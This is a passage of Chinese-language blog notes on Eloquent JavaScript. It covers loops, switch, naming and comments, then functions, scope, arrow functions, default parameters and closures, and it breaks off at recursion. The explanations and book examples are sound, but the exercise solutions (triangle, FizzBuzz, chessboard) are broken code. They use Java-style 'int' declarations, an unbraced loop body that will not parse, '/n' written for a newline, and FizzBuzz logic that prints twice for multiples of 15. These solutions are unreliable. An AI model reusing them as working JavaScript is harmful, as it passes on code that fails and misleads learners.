<p>如有多条路径可供选择，可将多个if/else链在一起。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="built_in">Number</span>(prompt(<span class="string">"Pick a number"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (num &lt; <span class="number">10</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Small"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">100</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Medium"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Large"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="while和do-while循环"><a href="#while和do-while循环" class="headerlink" title="while和do-while循环"></a>while和do-while循环</h2><p>计算机最厉害的地方就在于循环，有了循环，我们可以实现很多自动化的事情。如while循环：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> number = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (number &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(number);</span><br><span class="line">  number = number + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → 0</span></span><br><span class="line"><span class="comment">// → 2</span></span><br><span class="line"><span class="comment">//   … etcetera</span></span><br></pre></td></tr></table></figure>
<p>上面打印0到12的所有偶数。又如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> result = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (counter &lt; <span class="number">10</span>) &#123;</span><br><span class="line">  result = result * <span class="number">2</span>;</span><br><span class="line">  counter = counter + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line"><span class="comment">// → 1024</span></span><br></pre></td></tr></table></figure>
<p>计算2的10次方，都是很简单的程序。</p>
<p>do-while先执行循环体在判断条件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> yourName;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  yourName = prompt(<span class="string">"Who are you?"</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (!yourName);</span><br><span class="line"><span class="built_in">console</span>.log(yourName);</span><br></pre></td></tr></table></figure>

<p>逻辑非会将prompt返回的字符串值转为布尔值，字符串中，除了空字符串在转化成布尔值的时候返回false，其余都是true，也就意味着上面的程序会持续询问yourName直到yourName不是空字符串为止。</p>
<h2 id="缩进代码"><a href="#缩进代码" class="headerlink" title="缩进代码"></a>缩进代码</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> != <span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"That makes sense."</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">1</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"No surprise there."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>良好的缩进保证代码可读性。</p>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> number = <span class="number">0</span>; number &lt;= <span class="number">12</span>; number = number + <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → 0</span></span><br><span class="line"><span class="comment">// → 2</span></span><br><span class="line"><span class="comment">//   … etcetera</span></span><br></pre></td></tr></table></figure>
<p>for循环和while循环一样，只不过把常用的循环结构抽象为更简洁的结构。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> result = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> counter = <span class="number">0</span>; counter &lt; <span class="number">10</span>; counter = counter + <span class="number">1</span>) &#123;</span><br><span class="line">  result = result * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line"><span class="comment">// → 1024</span></span><br></pre></td></tr></table></figure>
<p>同样包含初始化，判断条件和迭代过后对状态的改变。</p>
<h2 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h2><p>除了判断条件为false外，还有一种机制跳出循环，就是<code>break</code>关键字。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> current = <span class="number">20</span>; ; current = current + <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (current % <span class="number">7</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(current);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → 21</span></span><br></pre></td></tr></table></figure>
<p>大于等于20并且是7的倍数。</p>
<p>还有一个关键字<code>continue</code>跳过当前循环直接进入下一次迭代。</p>
<h2 id="简洁改变变量"><a href="#简洁改变变量" class="headerlink" title="简洁改变变量"></a>简洁改变变量</h2><p>就是++，–，+=，-=，*=,/=等的运用，不赘述。</p>
<h2 id="用switch结构"><a href="#用switch结构" class="headerlink" title="用switch结构"></a>用switch结构</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x == <span class="string">"value1"</span>) action1();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="string">"value2"</span>) action2();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="string">"value3"</span>) action3();</span><br><span class="line"><span class="keyword">else</span> defaultAction();</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (prompt(<span class="string">"What is the weather like?"</span>)) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">"rainy"</span>:</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Remember to bring an umbrella."</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">"sunny"</span>:</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Dress lightly."</span>);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">"cloudy"</span>:</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Go outside."</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Unknown weather type!"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遇到break才会停止。</p>
<h2 id="大写"><a href="#大写" class="headerlink" title="大写"></a>大写</h2><p>变量名不许有空格，但是用多个单词表达含义是有益的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fuzzylittleturtle</span><br><span class="line">fuzzy_little_turtle</span><br><span class="line">FuzzyLittleTurtle</span><br><span class="line">fuzzyLittleTurtle</span><br></pre></td></tr></table></figure>
<p>JS采用最后一种驼峰式命名变量的方法。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> accountBalance = calculateBalance(account);</span><br><span class="line"><span class="comment">// It's a green hollow where a river sings</span></span><br><span class="line">accountBalance.adjust();</span><br><span class="line"><span class="comment">// Madly catching white tatters in the grass.</span></span><br><span class="line"><span class="keyword">let</span> report = <span class="keyword">new</span> Report();</span><br><span class="line"><span class="comment">// Where the sun on the proud mountain rings:</span></span><br><span class="line">addToReport(accountBalance, report);</span><br><span class="line"><span class="comment">// It's a little valley, foaming like light in a glass.</span></span><br></pre></td></tr></table></figure>
<p>// 单行注释<br>/* */ 多行注释</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  I first found this number scrawled on the back of an old notebook.</span></span><br><span class="line"><span class="comment">  Since then, it has often dropped by, showing up in phone numbers</span></span><br><span class="line"><span class="comment">  and the serial numbers of products that I've bought. It obviously</span></span><br><span class="line"><span class="comment">  likes me, so I've decided to keep it.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> myNumber = <span class="number">11213</span>;</span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="循环三角形"><a href="#循环三角形" class="headerlink" title="循环三角形"></a>循环三角形</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i++) </span><br><span class="line">    <span class="keyword">let</span> temp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; i; j++) </span><br><span class="line">        temp += <span class="string">"#"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(temp + <span class="string">"/n"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="FIZZBUZZ"><a href="#FIZZBUZZ" class="headerlink" title="FIZZBUZZ"></a>FIZZBUZZ</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(int i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> == <span class="number">0</span>) <span class="built_in">console</span>.log(<span class="string">"FizzBuzz"</span>);</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span>) <span class="built_in">console</span>.log(<span class="string">'Fizz'</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>) <span class="built_in">console</span>.log(<span class="string">"Buzz"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="棋盘"><a href="#棋盘" class="headerlink" title="棋盘"></a>棋盘</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(int i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(int j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>((i + j) % <span class="number">2</span> == <span class="number">0</span>) s += <span class="string">" "</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((i + j) % <span class="number">2</span> == <span class="number">1</span>) s += <span class="string">"#"</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(s + <span class="string">"/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ3</title>
    <url>/2018/12/19/EJ3/</url>
    <content><![CDATA[<h1 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h1><p>JS中的函数可以包装在一个变量当中，也就是说，JS中的函数和其他诸如数字，字符串类型别无二致，只是函数会有一些额外的特性。函数的存在使我们可以更好实现复用，使我们丰富我们的词汇表。</p>
<a id="more"></a>

<h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p>函数定义就是常规的变量声明，只是变量的值是一个函数。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> square = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(square(<span class="number">12</span>));</span><br><span class="line"><span class="comment">// → 144</span></span><br></pre></td></tr></table></figure>

<p>函数需要用一个function开头的表达式创建。函数包含一些参数和函数体，函数体被调用的时候，内部语句按顺序执行，函数体要包裹在大括号内部。</p>
<p>函数可以没有参数或有多个参数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> makeNoise = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Pling!"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">makeNoise();</span><br><span class="line"><span class="comment">// → Pling!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> power = <span class="function"><span class="keyword">function</span>(<span class="params">base, exponent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> count = <span class="number">0</span>; count &lt; exponent; count++) &#123;</span><br><span class="line">    result *= base;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(power(<span class="number">2</span>, <span class="number">10</span>));</span><br><span class="line"><span class="comment">// → 1024</span></span><br></pre></td></tr></table></figure>

<p>函数也可以有返回值也可以没有返回值（产生副作用，如makeNoise打印字符串），return后面没有表达式，就会导致返回underfined。</p>
<p>函数参数就是正常的变量绑定，只不过初始值是调用者给定。</p>
<h2 id="变量和作用域"><a href="#变量和作用域" class="headerlink" title="变量和作用域"></a>变量和作用域</h2><p>变量可以在程序的某一部分可见，这部分被叫做变量的作用域。对于定义在任何函数或者块外的变量，作用域是整个程序，你可以在任何时候引用这些变量，这些变量被叫做全局变量（global）。</p>
<p>但是函数参数里的变量只能够在函数内部引用，这些变量被叫做局部变量。每一次对函数的调用，这些变量的实例就会被创建。函数生活在自己的小世界里，不需要知道全局作用域发生了什么。</p>
<p>用let和const声明的变量实际上只在他们声明的块局部可见（块级作用域），所以如果在循环中用这种方式创建变量，循环前后的代码看不见这个变量。在pre-2015的JS，只有函数会创建新的作用域，所以旧的以var方式创建的变量在循环前后都是可见的。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> y = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">var</span> z = <span class="number">30</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(x + y + z);</span><br><span class="line">  <span class="comment">// → 60</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// y is not visible here</span></span><br><span class="line"><span class="built_in">console</span>.log(x + z);</span><br><span class="line"><span class="comment">// → 40</span></span><br></pre></td></tr></table></figure>
<p>每个作用域可以看到外面作用域的变量，有一种例外的情况是，当前局部作用域有一个同名变量，比如下面halve函数内部的引用n是自身作用域的n，而不是外部的n：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> halve = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> n / <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> n = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">console</span>.log(halve(<span class="number">100</span>));</span><br><span class="line"><span class="comment">// → 50</span></span><br><span class="line"><span class="built_in">console</span>.log(n);</span><br><span class="line"><span class="comment">// → 10</span></span><br></pre></td></tr></table></figure>

<h2 id="嵌套作用域"><a href="#嵌套作用域" class="headerlink" title="嵌套作用域"></a>嵌套作用域</h2><p>JS不仅区分全局作用域和局部作用域，块和函数可被嵌套在其它块或者函数中，产生不同程度的局部性。</p>
<p>比如下面的嵌套函数，输出制作鹰嘴豆泥的材料。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hummus = <span class="function"><span class="keyword">function</span>(<span class="params">factor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> ingredient = <span class="function"><span class="keyword">function</span>(<span class="params">amount, unit, name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ingredientAmount = amount * factor;</span><br><span class="line">    <span class="keyword">if</span> (ingredientAmount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      unit += <span class="string">"s"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;ingredientAmount&#125;</span> <span class="subst">$&#123;unit&#125;</span> <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  ingredient(<span class="number">1</span>, <span class="string">"can"</span>, <span class="string">"chickpeas"</span>);</span><br><span class="line">  ingredient(<span class="number">0.25</span>, <span class="string">"cup"</span>, <span class="string">"tahini"</span>);</span><br><span class="line">  ingredient(<span class="number">0.25</span>, <span class="string">"cup"</span>, <span class="string">"lemon juice"</span>);</span><br><span class="line">  ingredient(<span class="number">1</span>, <span class="string">"clove"</span>, <span class="string">"garlic"</span>);</span><br><span class="line">  ingredient(<span class="number">2</span>, <span class="string">"tablespoon"</span>, <span class="string">"olive oil"</span>);</span><br><span class="line">  ingredient(<span class="number">0.5</span>, <span class="string">"teaspoon"</span>, <span class="string">"cumin"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ingredient函数的代码能看见外部的factor变量，但局部变量如unit不能被外部函数看到。</p>
<p>在一个块中可见的变量集合取决于块在程序中的位置。每一个局部作用域能够看见包含他的局部作用域中的变量，所有作用域都可以看见全局作用域。这种变量可见性的策略叫做词法作用域（lexical scoping）。</p>
<h2 id="函数作为值"><a href="#函数作为值" class="headerlink" title="函数作为值"></a>函数作为值</h2><p>一个函数绑定通常都是以一个特定程序的名字存在的。这样的绑定只定义一次并不会改变，所以很容易混淆函数和他的名字。</p>
<p>但是这俩概念不同。函数值可以做一切其他值可以做的事情，可以用在任何表达式中，作为参数传递给别的函数等等。相似地，一个函数变量也只是一个常规的变量，如果不是constant，也可以被赋新的值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> launchMissiles = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  missileSystem.launch(<span class="string">"now"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (safeMode) &#123;</span><br><span class="line">  launchMissiles = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">/* do nothing */</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第五章会讨论高阶函数可做的有趣的事情。</p>
<h2 id="声明记号"><a href="#声明记号" class="headerlink" title="声明记号"></a>声明记号</h2><p>更简单的声明函数的方式如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是个函数声明，语句定义了square的绑定并将其指向一个函数，不需要在末尾包含分号且容易书写。</p>
<p>有个细微之处需要注意一下。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"The future says:"</span>, future());</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">future</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"You'll never have flying cars"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即便函数声明在调用者的下方，也可以正常运行。函数声明并不是常规的自顶向下的控制流。他们在概念上被移动到作用域的顶端并可以被该作用域所有的代码使用。这有时候很有用因为提供了一种机制，不需要担心在使用前还要声明所有的函数。</p>
<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>还有第三种函数标记，看起来和其他两种很不一样。用一个箭头而不是function关键字定义函数，也就是<code>=&gt;</code>。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> power = <span class="function">(<span class="params">base, exponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> count = <span class="number">0</span>; count &lt; exponent; count++) &#123;</span><br><span class="line">    result *= base;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>只有一个参数可以省略表示参数的括号。函数体如果是单个表达式，没有大括号的前提下，会被当成函数返回值返回。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> square1 = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;<span class="keyword">return</span> x * x;&#125;</span><br><span class="line"><span class="keyword">const</span> square2 = <span class="function"><span class="params">x</span> =&gt;</span> x * x;</span><br></pre></td></tr></table></figure>
<p>没有参数的箭头函数，参数列表只表示为一个空的括号，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> horn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"hh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在JS中包含函数表达式和箭头函数并没有什么深层次的原因，除了第六章将要讨论的细微的差异，他们起着同样的作用。箭头函数在2015年被添加，使得更紧凑的书写函数成为一种可能。第五章将会用到很多箭头函数。</p>
<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Hello "</span> + who);</span><br><span class="line">&#125;</span><br><span class="line">greet(<span class="string">"Harry"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Bye"</span>);</span><br></pre></td></tr></table></figure>
<p>函数调用时，控制权交给函数，但是函数需要知道自己结束之后返回的地方，而上下文的保存发生在栈中，当调用函数时，将当前上下文压栈，然后函数返回的时候，将栈顶层的上下文弹出栈，并且用弹出的上下文继续执行指令。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chicken</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> egg();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">egg</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> chicken();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(chicken() + <span class="string">" came first."</span>);</span><br><span class="line"><span class="comment">// → ??</span></span><br></pre></td></tr></table></figure>
<p>像上述的循环调用没有终止最终就会导致栈溢出。</p>
<h2 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h2><p>下面代码可以正常执行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> x * x; &#125;</span><br><span class="line"><span class="built_in">console</span>.log(square(<span class="number">4</span>, <span class="literal">true</span>, <span class="string">"hedgehog"</span>));</span><br><span class="line"><span class="comment">// → 16</span></span><br></pre></td></tr></table></figure>

<p>JS对于函数的传参特别宽容，不像java一样要检查函数签名。如果传递过多参数，简单忽略，传递过少，剩余的参数都将被赋值underfined。</p>
<p>缺点是错误传参时并没有提示。好处是允许一个函数通过不同数量的参数被调用。比如下面的<code>minus</code>函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">minus</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (b === <span class="literal">undefined</span>) <span class="keyword">return</span> -a;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(minus(<span class="number">10</span>));</span><br><span class="line"><span class="comment">// → -10</span></span><br><span class="line"><span class="built_in">console</span>.log(minus(<span class="number">10</span>, <span class="number">5</span>));</span><br><span class="line"><span class="comment">// → 5</span></span><br></pre></td></tr></table></figure>
<p>如果在参数后面写一个等号，后面写一个表达式，那么如果参数没有被调用者给定时，表达式的值将会代替这个参数，所谓的默认参数。比如下面的power函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">power</span>(<span class="params">base, exponent = <span class="number">2</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> count = <span class="number">0</span>; count &lt; exponent; count++) &#123;</span><br><span class="line">    result *= base;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(power(<span class="number">4</span>));</span><br><span class="line"><span class="comment">// → 16</span></span><br><span class="line"><span class="built_in">console</span>.log(power(<span class="number">2</span>, <span class="number">6</span>));</span><br><span class="line"><span class="comment">// → 64</span></span><br></pre></td></tr></table></figure>
<p>power的第二个参数可选，如果没有给定或者传递underfined参数给第二个参数，默认exponent为2，函数的作用表现为计算平方数。</p>
<p>下一章，将会学习一种方式，函数体可以得到传进来的参数列表。这很有用，因为使得函数可以接受任何数量的参数。如<code>console.log</code>就做了这样的事情：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"c"</span>, <span class="string">"0"</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>将函数当作一个值，组合局部变量在每次函数调用的时候创建的特性，带来了一个有趣的问题，当创造局部变量的函数调用不再active的时候，局部变量会怎样呢？</p>
<p>下面的例子展示了这个问题，<code>wrapValue</code>创造了一个局部绑定，然后返回了一个函数，这个函数获取并返回了这个局部绑定。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wrapValue</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> local = n;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> local;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wrap1 = wrapValue(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">let</span> wrap2 = wrapValue(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(wrap1());</span><br><span class="line"><span class="comment">// → 1</span></span><br><span class="line"><span class="built_in">console</span>.log(wrap2());</span><br><span class="line"><span class="comment">// → 2</span></span><br></pre></td></tr></table></figure>

<p>如你所见，两种情况的绑定都正常被获取了，这也很好的验证了，每次函数调用都会创建一个新的局部变量，不同的函数调用不会影响彼此。</p>
<p>这个特性，在封闭的作用域中可以引用本地绑定的一个特定实例，被叫做closure，也就是闭包。一个从局部作用域引用绑定的函数叫做一个闭包（closure）。这种特性不仅使你免于担心绑定的寿命，而且也可以以很创造性的方式使用函数。</p>
<p>我们可以将之前的例子转换成创造一个函数乘以任意数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiplier</span>(<span class="params">factor</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">number</span> =&gt;</span> number * factor;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> twice = multiplier(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(twice(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>

<p>需要一些练习来思考这样的程序，一个好的思维模型是，把函数当作同时包含函数体以及他们被创建的环境。当被调用时，函数体可以看见它被创建时的环境，而不是它被调用的环境。</p>
<p>例子中，multiplier被调用并创造了一个环境，这个环境中factor为2。返回的函数值存储在twice中，记得这个环境。所以当其被调用时，将参数乘以了2。</p>
<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>自己调用自己的函数叫做递归函数，只要具备终止条件不会爆栈即可。如power函数的递归版本：</p>
